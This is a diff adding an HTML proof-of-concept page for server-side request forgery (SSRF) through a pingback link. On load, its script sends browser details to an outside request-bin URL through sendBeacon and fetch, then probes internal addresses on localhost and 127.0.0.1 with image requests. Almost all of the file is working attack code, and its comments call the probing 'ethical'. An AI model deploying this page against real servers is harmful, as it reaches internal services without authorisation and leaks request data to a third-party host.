@@ -1,0 +1,46 @@
+<!-- poc_with_logging.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF Proof of Concept</title>
+</head>
+<body>
+    <a href="https://about.fb.com/news/2026/01/meta-nuclear-energy-projects-power-american-ai-leadership/">
+        Valid Pingback Link
+    </a>
+    
+    <script>
+        // Use a request bin to log access
+        const requestBinUrl = 'https://www.postb.in/b/1768485125375-6874195449054'; // Get from requestbin.com
+        
+        // Send minimal data to prove access
+        const logData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            referrer: document.referrer,
+            page: 'poc_with_logging.html'
+        };
+        
+        // Try to send beacon
+        navigator.sendBeacon(requestBinUrl, JSON.stringify(logData));
+        
+        // Fallback: Use fetch
+        fetch(requestBinUrl, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(logData),
+            mode: 'no-cors'  // Don't need response
+        }).catch(() => {});
+        
+        // Ethical internal test (no data collection)
+        const testUrls = [
+            'http://127.0.0.1:80/robots.txt',
+            'http://localhost:8080/health'
+        ];
+        
+        testUrls.forEach(url => {
+            new Image().src = url + '?test=' + Date.now();
+        });
+    </script>
+</body>
+</html>
